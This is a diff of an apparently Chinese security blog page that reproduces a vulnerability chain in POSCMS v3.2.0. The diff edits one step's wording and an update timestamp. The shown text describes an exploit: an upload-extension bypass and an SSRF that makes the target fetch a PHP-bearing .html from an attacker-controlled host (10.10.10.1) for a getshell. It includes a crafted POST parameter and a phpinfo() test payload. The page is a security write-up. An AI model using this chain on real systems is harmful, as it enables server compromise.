@@ -451,7 +451,7 @@ height:50vh;
 <ol>
 <li>构造特殊payload使.html文件允许被上传</li>
 <li>在自己控制的服务器上放置.html文件（里面有恶意代码的php代码）</li>
-<li>利用SSRF漏洞，使服务器用http协议访问带外数据（OOB），获取到恶意的.html，形成Getshell</li>
+<li>利用SSRF漏洞，使被攻击服务器用http协议访问带外数据（OOB），获取到恶意的.html，形成Getshell</li>
 </ol>
 <p>为了绕过扩展名检查，我将加密代码拷贝进另一文件并填入密钥，输入选择<code>1|html,|0</code>，运行得到输出为<code>22d7Qrdws88/R/uETpWlvY/PFNTYzvs/QNj5PBa66veNDlECqpM</code>，并构造POST参数<code>file=http://10.10.10.1/haha.html&amp;url=code=22d7Qrdws88/R/uETpWlvY/PFNTYzvs/QNj5PBa66veNDlECqpM</code>，这里的<code>haha.html</code>里包含了php代码<code>&lt;?php echo phpinfo();?&gt;</code>，最终效果如下：</p>
 <p><img src="/2019/04/17/POSCMSv3-2-0漏洞套餐复现/14.png" alt></p>
@@ -489,7 +489,7 @@ height:50vh;
             <p>原文作者：<a href="https://l1nf3ng.github.io">Li linfeng</a>
             </p><p>原文链接：<a href="https://l1nf3ng.github.io/2019/04/17/POSCMSv3-2-0漏洞套餐复现/">https://l1nf3ng.github.io/2019/04/17/POSCMSv3-2-0漏洞套餐复现/</a>
             </p><p>发表日期：<a href="https://l1nf3ng.github.io/2019/04/17/POSCMSv3-2-0漏洞套餐复现/">April 17th 2019, 9:34:18 am</a>
-            </p><p>更新日期：<a href="https://l1nf3ng.github.io/2019/04/17/POSCMSv3-2-0漏洞套餐复现/">April 19th 2019, 9:25:04 am</a>
+            </p><p>更新日期：<a href="https://l1nf3ng.github.io/2019/04/17/POSCMSv3-2-0漏洞套餐复现/">April 19th 2019, 9:34:46 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
